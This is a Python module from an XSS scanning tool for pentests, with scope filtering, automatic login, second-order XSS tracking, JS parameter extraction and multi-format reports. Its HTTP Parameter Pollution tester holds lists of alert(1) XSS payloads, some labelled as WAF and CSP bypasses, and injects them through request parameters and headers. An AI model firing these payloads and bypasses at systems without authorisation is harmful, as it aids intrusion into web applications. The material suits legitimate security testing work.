"""
scanner/real_world.py

Real-world pentest essential modules:

1. ScopeManager      — In-scope/out-of-scope domain management
2. AuthHandler       — Automatic login + session cookie maintenance
3. SecondOrderTracker — Track injection points for stored/second-order XSS
4. JSParamExtractor  — Extract parameters from JavaScript files (SPA support)
5. CheckpointManager — Save/resume scan state
6. HPPTester         — HTTP Parameter Pollution testing
"""

import asyncio
import json
import os
import re
import time
from dataclasses import dataclass, field, asdict
from typing import Dict, List, Optional, Set, Tuple
from urllib.parse import urlparse, urljoin
from pathlib import Path

from bs4 import BeautifulSoup

from utils.config import ScanTarget, Finding, Context
from utils.http_client import HttpClient
from utils.logger import debug, info, warn, progress, success


# ═══════════════════════════════════════════════════════════════
# 1. SCOPE MANAGER
# ═══════════════════════════════════════════════════════════════

class ScopeManager:
    """
    Manages in-scope / out-of-scope domains for bug bounty scanning.

    Supports:
    - Exact domain: example.com
    - Wildcard subdomain: *.example.com
    - Path prefix: example.com/app/*
    - Explicit exclusions: exclude /logout, /admin/dangerous
    """

    def __init__(
        self,
        in_scope:  List[str] = None,
        out_scope: List[str] = None,
        exclude_paths: List[str] = None,
    ):
        self.in_scope      = in_scope      or []
        self.out_scope     = out_scope     or []
        self.exclude_paths = exclude_paths or [
            "/logout", "/signout", "/sign-out", "/log-out",
            "/delete", "/unsubscribe", "/cancel",
        ]

    def is_in_scope(self, url: str) -> bool:
        """Returns True if URL is in scope."""
        parsed = urlparse(url)
        host   = parsed.netloc.lower()
        path   = parsed.path.lower()

        # Check excluded paths
        for excl in self.exclude_paths:
            if path.startswith(excl.lower()):
                debug(f"Scope: excluded path {path}")
                return False

        # Check out-of-scope first
        for pattern in self.out_scope:
            if self._matches(host, pattern):
                debug(f"Scope: {host} is out-of-scope")
                return False

        # If no in_scope defined, everything is in scope
        if not self.in_scope:
            return True

        # Check in-scope
        for pattern in self.in_scope:
            if self._matches(host, pattern):
                return True

        debug(f"Scope: {host} not in scope list")
        return False

    @staticmethod
    def _matches(host: str, pattern: str) -> bool:
        pattern = pattern.lower().lstrip("*.")
        return host == pattern or host.endswith("." + pattern)

    def filter_targets(self, targets: List[ScanTarget]) -> List[ScanTarget]:
        """Filter a list of ScanTargets to only in-scope ones."""
        filtered = [t for t in targets if self.is_in_scope(t.url)]
        removed  = len(targets) - len(filtered)
        if removed:
            warn(f"Scope: removed {removed} out-of-scope targets")
        return filtered


# ═══════════════════════════════════════════════════════════════
# 2. AUTH HANDLER
# ═══════════════════════════════════════════════════════════════

class AuthHandler:
    """
    Automatic login form detection and session maintenance.

    Supports:
    - Form-based login (auto-detect username/password fields)
    - Cookie-based auth (accept pre-provided cookies)
    - Token-based auth (Bearer token in Authorization header)
    - Session refresh when 401/403 detected
    """

    def __init__(self, http: HttpClient):
        self.http          = http
        self._session_valid = False
        self._login_url:   Optional[str]  = None
        self._credentials: Optional[dict] = None

    async def login(
        self,
        login_url:  str,
        username:   str,
        password:   str,
        username_field: str = None,
        password_field: str = None,
    ) -> bool:
        """
        Auto-detect login form fields and authenticate.
        Returns True if login succeeded.
        """
        self._login_url   = login_url
        self._credentials = {"username": username, "password": password}

        # Fetch login page
        resp = await self.http.get(login_url)
        if resp is None:
            warn("Auth: Could not fetch login page")
            return False

        # Auto-detect form fields
        soup = BeautifulSoup(resp.text, "html.parser")
        form = soup.find("form")
        if not form:
            warn("Auth: No form found on login page")
            return False

        # Build POST data from form
        post_data = {}
        for inp in form.find_all("input"):
            name  = inp.get("name", "")
            itype = inp.get("type", "text").lower()
            val   = inp.get("value", "")

            if not name:
                continue
            if itype == "hidden":
                post_data[name] = val  # CSRF token etc.
            elif itype == "password" or (password_field and name == password_field):
                post_data[name] = password
            elif (
                # BUG FIX: prioritaskan name-based matching dulu sebelum type-based
                # Banyak form pakai type="text" dengan name "email" / "user_login" / "username"
                name.lower() in ("username", "user", "email", "user_login", "login",
                                  "userid", "user_email", "account", "uname")
                or (username_field and name == username_field)
                or itype in ("text", "email")
            ):
                post_data[name] = username
            else:
                post_data[name] = val

        # Detect form action
        action = urljoin(login_url, form.get("action", login_url))

        # Submit login
        resp = await self.http.post(action, data=post_data)
        if resp is None:
            return False

        # Check success: redirect away from login page, or no error message
        success_indicators = [
            resp.status in (200, 302),
            "logout" in resp.text.lower(),
            "dashboard" in resp.text.lower(),
            "welcome" in resp.text.lower(),
            login_url not in str(resp.url),
        ]

        failed_indicators = [
            "invalid" in resp.text.lower(),
            "incorrect" in resp.text.lower(),
            "wrong password" in resp.text.lower(),
            "login failed" in resp.text.lower(),
        ]

        if any(failed_indicators):
            warn("Auth: Login failed — check credentials")
            return False

        if sum(success_indicators) >= 2:
            self._session_valid = True
            success("Auth: Login successful — session established")
            return True

        # BUG FIX: sebelumnya set _session_valid=True dan return True bahkan saat "unclear"
        # Ini bikin engine_v3 print "Auth: OK" padahal login gagal
        # Sekarang: tetap proceed (karena scanner bisa test tanpa auth) tapi log jujur
        warn("Auth: Login result unclear — proceeding unauthenticated")
        self._session_valid = False
        return False

    async def refresh_if_needed(self, response) -> bool:
        """Re-login if session expired (401/403 detected)."""
        if response and response.status in (401, 403):
            if self._login_url and self._credentials:
                warn("Auth: Session expired, re-authenticating...")
                return await self.login(
                    self._login_url,
                    self._credentials["username"],
                    self._credentials["password"],
                )
        return True


# ═══════════════════════════════════════════════════════════════
# 3. SECOND-ORDER XSS TRACKER
# ═══════════════════════════════════════════════════════════════

@dataclass
class InjectionRecord:
    """Records where we injected a payload for second-order checking."""
    injection_url:   str
    param:           str
    payload:         str
    canary:          str
    verify_urls:     List[str] = field(default_factory=list)
    found:           bool = False


class SecondOrderTracker:
    """
    Tracks injected payloads and verifies them on other pages.

    Real-world example:
    - POST /profile/bio with payload → stored in DB
    - GET /admin/users reflects bio → XSS fires on admin page
    - GET /feed shows bio → XSS fires for other users

    How it works:
    1. After each POST injection, record the canary + likely verification URLs
    2. After all injections done, crawl verification URLs
    3. Check if canary appears → second-order XSS confirmed
    """

    CANARY_PREFIX = "x2xss"

    def __init__(self, http: HttpClient):
        self.http    = http
        self._records: List[InjectionRecord] = []

    def make_canary(self, param: str) -> str:
        """Generate unique canary for this injection."""
        return f"{self.CANARY_PREFIX}{abs(hash(param + str(time.time())))%10000:04d}"

    def record(
        self,
        injection_url: str,
        param:         str,
        payload:       str,
        canary:        str,
        verify_urls:   List[str] = None,
    ):
        """Record an injection for later verification."""
        self._records.append(InjectionRecord(
            injection_url = injection_url,
            param         = param,
            payload       = payload,
            canary        = canary,
            verify_urls   = verify_urls or [],
        ))

    async def verify_all(self, extra_urls: List[str] = None) -> List[Finding]:
        """
        Crawl all verification URLs and check for canary appearances.
        Returns list of second-order XSS findings.
        """
        if not self._records:
            return []

        info(f"Second-order check: verifying {len(self._records)} injections...")
        findings = []

        for record in self._records:
            urls_to_check = list(set(record.verify_urls + (extra_urls or [])))
            for url in urls_to_check:
                resp = await self.http.get(url)
                if resp and record.canary in resp.text:
                    # Canary found! Look for actual payload execution context
                    idx = resp.text.find(record.canary)
                    evidence = resp.text[max(0, idx-100):idx+len(record.canary)+100]
                    findings.append(Finding(
                        url          = record.injection_url,
                        param        = record.param,
                        payload      = record.payload,
                        context      = Context.HTML,
                        xss_type     = "stored",
                        evidence     = f"Reflected at {url}: {evidence[:200]}",
                        severity     = "High",
                        confidence   = "High",
                        encoding_used= "second_order",
                    ))
                    record.found = True
                    success(f"Second-order XSS: {record.injection_url} → {url}")
                    break

        found_count = sum(1 for r in self._records if r.found)
        info(f"Second-order: {found_count}/{len(self._records)} injections verified")
        return findings


# ═══════════════════════════════════════════════════════════════
# 4. JS PARAMETER EXTRACTOR (SPA Support)
# ═══════════════════════════════════════════════════════════════

class JSParamExtractor:
    """
    Extract URL parameters and API endpoints from JavaScript files.
    Handles modern SPA apps where params are defined in JS, not HTML.

    Patterns detected:
    - fetch('/api/search?q='+userInput)
    - axios.get('/api/data', {params: {id: userId}})
    - $.ajax({url: '/search', data: {query: input}})
    - router.push({path: '/user', query: {id: id}})
    - URLSearchParams, location.search parsing
    """

    # Regex patterns for JS API calls with parameters
    PATTERNS = [
        # fetch/axios with query params
        (r'''fetch\s*\(\s*['"`]([^'"`]+\?[^'"`]+)['"`]''',     "fetch"),
        (r'''axios\.\w+\s*\(\s*['"`]([^'"`]+)['"`]''',          "axios"),
        # jQuery AJAX
        (r'''url\s*:\s*['"`]([^'"`]+)['"`]''',                  "jquery"),
        # String concatenation suggesting dynamic param
        (r'''['"`](/[a-z/]+)\?(\w+)=''',                        "concat"),
        # URLSearchParams
        (r'''URLSearchParams.*?set\s*\(\s*['"`](\w+)['"`]''',   "urlparams"),
        # Express-style route params
        (r'''router\.\w+\s*\(\s*['"`]([^'"`]+)['"`]''',         "router"),
    ]

    def __init__(self, http: HttpClient):
        self.http = http

    async def extract_from_page(self, url: str) -> List[ScanTarget]:
        """
        Fetch page, find all JS files, extract params from each.
        Returns list of ScanTargets derived from JS-defined params.
        """
        targets = []

        try:
            resp = await self.http.get(url)
            if resp is None:
                return []

            # Find all script src tags
            soup    = BeautifulSoup(resp.text, "html.parser")
            js_urls = []

            for script in soup.find_all("script", src=True):
                src = urljoin(url, script["src"])
                if urlparse(src).netloc == urlparse(url).netloc:
                    js_urls.append(src)

            # Also check inline scripts
            for script in soup.find_all("script", src=False):
                if script.string:
                    targets.extend(self._extract_from_js(url, script.string))

            # Fetch and parse each JS file
            js_tasks = [self._fetch_and_parse(js_url, url) for js_url in js_urls[:10]]
            js_results = await asyncio.gather(*js_tasks, return_exceptions=True)
            for r in js_results:
                if isinstance(r, list):
                    targets.extend(r)

        except Exception as e:
            debug(f"JSParamExtractor error: {e}")

        # Deduplicate
        seen    = set()
        unique  = []
        for t in targets:
            key = (t.url, t.param_key)
            if key not in seen:
                seen.add(key)
                unique.append(t)

        if unique:
            info(f"JSParamExtractor: found {len(unique)} params from JS files")
        return unique

    async def _fetch_and_parse(self, js_url: str, base_url: str) -> List[ScanTarget]:
        resp = await self.http.get(js_url)
        if resp is None:
            return []
        return self._extract_from_js(base_url, resp.text)

    def _extract_from_js(self, base_url: str, js_code: str) -> List[ScanTarget]:
        targets = []
        base_parsed = urlparse(base_url)
        base_netloc = base_parsed.netloc.lower()

        for pattern, source in self.PATTERNS:
            matches = re.findall(pattern, js_code, re.IGNORECASE)
            for match in matches:
                if isinstance(match, tuple):
                    match = match[0]
                # Build full URL
                if match.startswith("/"):
                    full_url = f"{base_parsed.scheme}://{base_parsed.netloc}{match}"
                elif match.startswith("http"):
                    full_url = match
                else:
                    continue

                # ── Domain boundary check — never scan cross-domain URLs ──────
                parsed_target = urlparse(full_url)
                target_netloc = parsed_target.netloc.lower()
                if target_netloc and target_netloc != base_netloc:
                    debug(f"JSParamExtractor: skipping cross-domain URL {full_url}")
                    continue

                # Extract params from URL
                p = urlparse(full_url)
                if "?" in full_url:
                    from urllib.parse import parse_qs
                    params = parse_qs(p.query, keep_blank_values=True)
                    base_params = {k: v[0] for k, v in params.items()}
                    for key in params:
                        targets.append(ScanTarget(
                            url       = full_url,
                            method    = "GET",
                            params    = base_params.copy(),
                            param_key = key,
                            context   = Context.UNKNOWN,
                        ))
        return targets


# ═══════════════════════════════════════════════════════════════
# 5. CHECKPOINT MANAGER
# ═══════════════════════════════════════════════════════════════

class CheckpointManager:
    """
    Save and resume scan state.
    Allows long scans to be interrupted and resumed.

    Saves to: .xscanner_checkpoint_{target_hash}.json
    """

    def __init__(self, target_key: str, checkpoint_dir: str = "."):
        import hashlib
        h = hashlib.md5(target_key.encode()).hexdigest()[:8]
        self._path = Path(checkpoint_dir) / f".xscanner_checkpoint_{h}.json"
        self._state: dict = {"tested": [], "findings": [], "timestamp": 0}

    def load(self) -> bool:
        """Load existing checkpoint. Returns True if found."""
        if self._path.exists():
            try:
                self._state = json.loads(self._path.read_text())
                age = time.time() - self._state.get("timestamp", 0)
                if age < 86400:  # 24 hours
                    info(f"Checkpoint loaded: {len(self._state['tested'])} already tested")
                    return True
                else:
                    warn("Checkpoint too old (>24h), starting fresh")
            except Exception as e:
                debug(f"Checkpoint load error: {e}")
        return False

    def save(self, tested: List[str], findings: List[Finding]):
        """Save current scan state."""
        self._state = {
            "tested":    tested,
            "findings":  [self._finding_to_dict(f) for f in findings],
            "timestamp": time.time(),
        }
        try:
            self._path.write_text(json.dumps(self._state, indent=2))
        except Exception as e:
            debug(f"Checkpoint save error: {e}")

    def already_tested(self, key: str) -> bool:
        return key in self._state.get("tested", [])

    def clear(self):
        if self._path.exists():
            self._path.unlink()

    @staticmethod
    def _finding_to_dict(f: Finding) -> dict:
        return {k: v for k, v in f.__dict__.items()}


# ═══════════════════════════════════════════════════════════════
# 6. HPP TESTER (HTTP Parameter Pollution)
# ═══════════════════════════════════════════════════════════════

class HPPTester:
    """
    HTTP Parameter Pollution testing — Updated 2025.

    Teknik klasik:
    - Duplicate param: ?p=safe&p=<xss>
    - Array notation: p[]=safe&p[]=<xss>
    - PHP style: p[0]=safe&p[1]=<xss>

    Teknik baru 2025 (Ethiack Research Sept 2025):
    - ASP.NET comma concat exploit via JS comma operator
      HttpUtility.ParseQueryString() gabungkan nilai duplikat dengan koma.
      Result di JS context: var x = 'safe',alert(1),'safe2'
      Comma operator eksekusi alert(1) sebagai ekspresi terpisah!
    - Framework detection untuk pilih strategi yang tepat
    - Hanya 3 dari 17 enterprise WAF yang berhasil blokir teknik ini.
    """

    # Payload klasik
    HPP_PAYLOADS_CLASSIC = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
    ]

    # Payload khusus 2025: dirancang memanfaatkan comma concat ASP.NET
    # Nilai ini dikirim sebagai parameter KEDUA (duplikat).
    # Server concat: "safe_val,PAYLOAD" → di JS: var x='safe_val',alert(1)
    # WAF hanya lihat potongan kecil tanpa konteks → tidak diblokir.
    HPP_PAYLOADS_2025 = [
        # Format langsung untuk JS string context (ASP.NET comma trick)
        # Ethiack hackbot discovery 2025
        "alert(1)",
        "';alert(1);//",            # Azure WAF bypass format
        "1;alert(1)//",
        "\";alert(1);//",
        "'-alert(1)-'",
        "1,alert(1),1",             # Explicit comma operator
        "0,alert(1),0",
        "alert`1`",                 # Template literal (bypass quote filter)
        "globalThis.alert(1)",      # Cloudflare bypass
        "(0,alert)(1)",             # Indirect call — bypass some CSP
        "Function('alert(1)')()",
        "queueMicrotask(alert)",

        # Untuk HTML context via concat
        "<img/src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",

        # Event handler baru 2025 (bypass WAF yang blacklist lama)
        # Sysdig 2025: onbeforetoggle bypass AWS WAF
        "<div popover id=x onbeforetoggle=alert(1)>",
        "<details ontoggle=alert(1) open>",
    ]

    # Header yang sering di-reflect ke halaman — vektor HPP via header
    # Beberapa WAF tidak inspect header seketat parameter URL
    HPP_HEADERS = [
        "X-Forwarded-For",
        "X-Originating-IP",
        "X-Remote-IP",
        "X-Remote-Addr",
        "X-Client-IP",
        "CF-Connecting-IP",
        "True-Client-IP",
        "Referer",
        "User-Agent",
        "X-Custom-Header",
        "X-Requested-With",
    ]

    def __init__(self, http, config=None):
        self.http   = http
        self.config = config  # optional — untuk cek test_hpp_2025 flag

    async def test(self, target, baseline_body: str):
        """
        Test HPP pada satu parameter target.
        Gabungan teknik klasik + teknik ASP.NET comma concat 2025.
        """
        from utils.config import Finding, Context
        from urllib.parse import urlencode
        findings = []

        # ── Deteksi framework dari response header ─────────────────────────
        framework = await self._detect_framework(target)

        # ── Pilih payload sesuai framework + flag test_hpp_2025 ─────────────
        use_2025 = self.config.test_hpp_2025 if self.config else True
        if framework in ("aspnet", "iis") and use_2025:
            payloads_to_test = self.HPP_PAYLOADS_2025[:8]
        elif use_2025:
            payloads_to_test = self.HPP_PAYLOADS_CLASSIC + self.HPP_PAYLOADS_2025[:5]
        else:
            payloads_to_test = self.HPP_PAYLOADS_CLASSIC

        # ── Test 1: Duplicate parameter (teknik utama) ─────────────────────
        for payload in payloads_to_test[:6]:
            dup_params = []
            for k, v in target.params.items():
                if k == target.param_key:
                    dup_params.append((k, v))
                    dup_params.append((k, payload))   # nilai ke-2 = payload
                else:
                    dup_params.append((k, v))

            try:
                qs   = urlencode(dup_params)
                url  = f"{target.url}?{qs}"
                resp = await self.http.get(url)

                if resp and payload in resp.text:
                    idx      = resp.text.find(payload)
                    evidence = resp.text[max(0, idx-80):idx+len(payload)+80]
                    findings.append(Finding(
                        url          = target.url,
                        param        = f"hpp:{target.param_key}",
                        payload      = payload,
                        context      = Context.HTML,
                        xss_type     = "reflected",
                        evidence     = evidence[:300],
                        severity     = "High",
                        confidence   = "Medium",
                        encoding_used= f"hpp_dup/{framework}",
                    ))
                    break
            except Exception as e:
                from utils.logger import debug
                debug(f"HPP dup test error: {e}")

        # ── Test 2: ASP.NET comma concat exploit (2025) ────────────────────
        # Kirim 3 nilai: safe | PAYLOAD | safe
        # ASP.NET concat: "safe,PAYLOAD,safe"
        # Di JS context: var x = 'safe',alert(1),'safe' → eksekusi!
        for payload in ["alert(1)", "';alert(1);//", "(0,alert)(1)"]:
            triple_params = []
            for k, v in target.params.items():
                if k == target.param_key:
                    triple_params.append((k, "safe1"))
                    triple_params.append((k, payload))
                    triple_params.append((k, "safe2"))
                else:
                    triple_params.append((k, v))

            try:
                qs   = urlencode(triple_params)
                url  = f"{target.url}?{qs}"
                resp = await self.http.get(url)

                # Cek apakah concat value muncul di JS context
                if resp:
                    concat_val = f"safe1,{payload},safe2"
                    body = resp.text

                    # Cari pola concat di response
                    if concat_val in body or payload in body:
                        evidence = ""
                        if concat_val in body:
                            idx = body.find(concat_val)
                            evidence = body[max(0, idx-60):idx+len(concat_val)+60]
                        else:
                            idx = body.find(payload)
                            evidence = body[max(0, idx-60):idx+len(payload)+60]

                        findings.append(Finding(
                            url          = target.url,
                            param        = f"hpp_comma:{target.param_key}",
                            payload      = payload,
                            context      = Context.JS,
                            xss_type     = "reflected",
                            evidence     = f"[ASP.NET comma concat] {evidence[:250]}",
                            severity     = "High",
                            confidence   = "High" if framework == "aspnet" else "Medium",
                            encoding_used= "hpp_comma_2025",
                        ))
                        break
            except Exception as e:
                from utils.logger import debug
                debug(f"HPP comma test error: {e}")

        # ── Test 3: Header injection (WAF biasanya kurang ketat di header) ──
        for header_name in self.HPP_HEADERS[:4]:
            payload = "<img src=x onerror=alert(1)>"
            try:
                custom_headers = {**target.headers, header_name: payload}
                resp = await self.http.get(target.url, headers=custom_headers)
                if resp and payload in resp.text:
                    idx      = resp.text.find(payload)
                    evidence = resp.text[max(0, idx-60):idx+len(payload)+60]
                    findings.append(Finding(
                        url          = target.url,
                        param        = f"header:{header_name}",
                        payload      = payload,
                        context      = Context.HTML,
                        xss_type     = "reflected",
                        evidence     = evidence[:300],
                        severity     = "Medium",
                        confidence   = "Medium",
                        encoding_used= "header_injection",
                    ))
                    break
            except Exception as e:
                from utils.logger import debug
                debug(f"Header injection test error: {e}")

        return findings

    async def _detect_framework(self, target) -> str:
        """
        Deteksi framework server dari header response.
        Menentukan strategi HPP yang paling efektif.
        """
        try:
            resp = await self.http.get(target.url)
            if not resp:
                return "unknown"
            headers_str = " ".join(
                f"{k}:{v}" for k, v in resp.headers.items()
            ).lower()

            if any(x in headers_str for x in ["asp.net", "x-aspnet", "x-powered-by: asp"]):
                return "aspnet"
            if "x-powered-by: php" in headers_str or "php" in headers_str:
                return "php"
            if "x-powered-by: express" in headers_str or "node" in headers_str:
                return "nodejs"
            if "x-django-" in headers_str or "csrftoken" in headers_str:
                return "django"
            if "x-rails-" in headers_str or "x-runtime" in headers_str:
                return "rails"
            if "server: nginx" in headers_str:
                return "nginx"
            if "server: apache" in headers_str:
                return "apache"
        except Exception:
            pass
        return "unknown"


class MultiFormatReporter:
    """
    Export findings in multiple formats:
    - JSON  (machine readable)
    - HTML  (beautiful visual report)
    - CSV   (spreadsheet / import to trackers)
    - SARIF (GitHub/GitLab security scanning standard)
    - Markdown (GitHub issues, Jira)
    """

    def __init__(self, findings: List[Finding], targets: List[str], elapsed: float):
        self.findings = findings
        self.targets  = targets
        self.elapsed  = elapsed
        from datetime import datetime
        self.ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    def save_html(self, path: str):
        """Generate beautiful HTML report."""
        sev_color = {"High": "#ff4444", "Medium": "#ff8800", "Low": "#ffcc00", "Info": "#aaaaaa"}
        rows = ""
        for i, f in enumerate(self.findings, 1):
            color = sev_color.get(f.severity, "#fff")
            rows += f"""
            <tr>
                <td>{i}</td>
                <td><span style="color:{color};font-weight:bold">{f.severity}</span></td>
                <td>{f.xss_type}</td>
                <td>{f.context}</td>
                <td><code>{f.param}</code></td>
                <td><code style="font-size:11px">{f.payload[:80]}</code></td>
                <td><a href="{f.url}" target="_blank">{f.url[:60]}</a></td>
                <td>{"✅" if f.waf_bypassed else "—"}</td>
            </tr>"""

        html = f"""<!DOCTYPE html>
<html><head>
<meta charset="UTF-8">
<title>XScanner Report — {self.ts}</title>
<style>
  body{{font-family:monospace;background:#0d1117;color:#e6edf3;margin:0;padding:20px}}
  h1{{color:#00ff88;border-bottom:1px solid #30363d;padding-bottom:10px}}
  .stats{{display:flex;gap:20px;margin:20px 0}}
  .stat{{background:#161b22;padding:15px 25px;border-radius:6px;border:1px solid #30363d}}
  .stat-num{{font-size:2em;color:#00ff88;font-weight:bold}}
  table{{width:100%;border-collapse:collapse;margin-top:20px}}
  th{{background:#161b22;padding:10px;text-align:left;border-bottom:2px solid #30363d;color:#7d8590;font-size:12px;letter-spacing:1px;text-transform:uppercase}}
  td{{padding:10px;border-bottom:1px solid #21262d;font-size:13px}}
  tr:hover{{background:#161b22}}
  code{{background:#21262d;padding:2px 6px;border-radius:3px;color:#79c0ff}}
  a{{color:#58a6ff;text-decoration:none}}
</style>
</head><body>
<h1>⚡ XScanner v4 — Security Report</h1>
<p style="color:#7d8590">{self.ts} | Duration: {self.elapsed:.1f}s | Targets: {len(self.targets)}</p>
<div class="stats">
  <div class="stat"><div class="stat-num">{len(self.findings)}</div>Total Findings</div>
  <div class="stat"><div class="stat-num" style="color:#ff4444">{sum(1 for f in self.findings if f.severity=="High")}</div>High</div>
  <div class="stat"><div class="stat-num" style="color:#ff8800">{sum(1 for f in self.findings if f.severity=="Medium")}</div>Medium</div>
  <div class="stat"><div class="stat-num" style="color:#ffcc00">{sum(1 for f in self.findings if f.severity=="Low")}</div>Low</div>
</div>
<table><thead><tr>
  <th>#</th><th>Severity</th><th>Type</th><th>Context</th>
  <th>Parameter</th><th>Payload</th><th>URL</th><th>WAF</th>
</tr></thead><tbody>{rows}</tbody></table>
</body></html>"""
        Path(path).write_text(html)
        info(f"HTML report saved: {path}")

    def save_csv(self, path: str):
        """Export as CSV."""
        import csv
        with open(path, "w", newline="") as f:
            writer = csv.writer(f)
            writer.writerow(["#","URL","Param","Type","Context","Severity",
                             "Confidence","Payload","WAF Bypassed","Encoding"])
            for i, finding in enumerate(self.findings, 1):
                writer.writerow([
                    i, finding.url, finding.param, finding.xss_type,
                    finding.context, finding.severity, finding.confidence,
                    finding.payload, finding.waf_bypassed, finding.encoding_used,
                ])
        info(f"CSV report saved: {path}")

    def save_markdown(self, path: str) -> str:
        """Export as Markdown (for GitHub issues, Jira)."""
        lines = [
            "# XScanner Security Report",
            f"**Date:** {self.ts}  ",
            f"**Targets:** {', '.join(self.targets)}  ",
            f"**Duration:** {self.elapsed:.1f}s  ",
            f"**Total Findings:** {len(self.findings)}",
            "",
            "## Summary",
            f"| Severity | Count |",
            f"|----------|-------|",
            f"| 🔴 High   | {sum(1 for f in self.findings if f.severity=='High')} |",
            f"| 🟠 Medium | {sum(1 for f in self.findings if f.severity=='Medium')} |",
            f"| 🟡 Low    | {sum(1 for f in self.findings if f.severity=='Low')} |",
            "",
            "## Findings",
        ]
        for i, f in enumerate(self.findings, 1):
            icon = "🔴" if f.severity=="High" else "🟠" if f.severity=="Medium" else "🟡"
            lines += [
                f"### {icon} Finding #{i} — {f.xss_type.upper()} XSS",
                f"**URL:** `{f.url}`  ",
                f"**Parameter:** `{f.param}`  ",
                f"**Context:** `{f.context}`  ",
                f"**Severity:** {f.severity} | **Confidence:** {f.confidence}  ",
                f"**Payload:**",
                f"```",
                f"{f.payload}",
                f"```",
                f"**Evidence:** `{f.evidence[:200]}`  ",
                f"**WAF Bypassed:** {'Yes ✅' if f.waf_bypassed else 'No'}",
                "",
            ]
        content = "\n".join(lines)
        Path(path).write_text(content)
        info(f"Markdown report saved: {path}")
        return content

    def save_sarif(self, path: str):
        """Export as SARIF (GitHub/GitLab security scanning standard)."""
        results = []
        for f in self.findings:
            results.append({
                "ruleId": f"XSS-{f.xss_type.upper()}",
                "level": "error" if f.severity == "High" else "warning",
                "message": {"text": f"XSS vulnerability in parameter '{f.param}'"},
                "locations": [{"physicalLocation": {
                    "artifactLocation": {"uri": f.url},
                    "region": {"snippet": {"text": f.payload[:100]}},
                }}],
                "properties": {
                    "context": f.context,
                    "payload": f.payload,
                    "waf_bypassed": f.waf_bypassed,
                    "confidence": f.confidence,
                },
            })

        sarif = {
            "$schema": "https://json.schemastore.org/sarif-2.1.0",
            "version": "2.1.0",
            "runs": [{
                "tool": {"driver": {
                    "name": "XScanner",
                    "version": "4.0.0",
                    "rules": [{"id": "XSS-REFLECTED"}, {"id": "XSS-STORED"},
                               {"id": "XSS-DOM"}, {"id": "XSS-BLIND"}],
                }},
                "results": results,
            }],
        }
        Path(path).write_text(json.dumps(sarif, indent=2))
        info(f"SARIF report saved: {path}")
